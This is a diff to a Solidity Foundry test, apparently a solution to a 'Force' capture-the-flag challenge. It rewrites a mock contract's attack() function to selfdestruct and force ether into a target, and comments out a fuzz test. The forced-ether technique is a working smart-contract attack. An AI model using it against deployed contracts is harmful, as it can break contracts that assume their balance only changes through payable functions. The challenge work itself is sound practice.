@@ -11,9 +11,8 @@ contract MockContract {
         _target = target_;
     }
 
-    function attack(uint256 amount_) public returns(bool) {
-        (bool success ,) = _target.call{value: amount_}("");
-        return success;
+    function attack() public {
+        selfdestruct(payable(_target));
     }
 }
 
@@ -31,16 +30,15 @@ contract ForceTest is Test {
     }
 
     function test_forceAttack() public {
-        vm.deal(address(this), 1 ether);
         vm.deal(address(mockContract), 2 ether);
-        mockContract.attack(0.1 ether);
+        mockContract.attack();
 
         console.log(address(forceContract).balance);
     }
 
-    function testFuzz_force(uint256 x) public {
+    // function testFuzz_force(uint256 x) public {
 
-        (bool success ,) = address(forceContract).call{value: x}("");
-        if(!success) revert();
-    }
+    //     (bool success ,) = address(forceContract).call{value: x}("");
+    //     if(!success) revert();
+    // }
 }
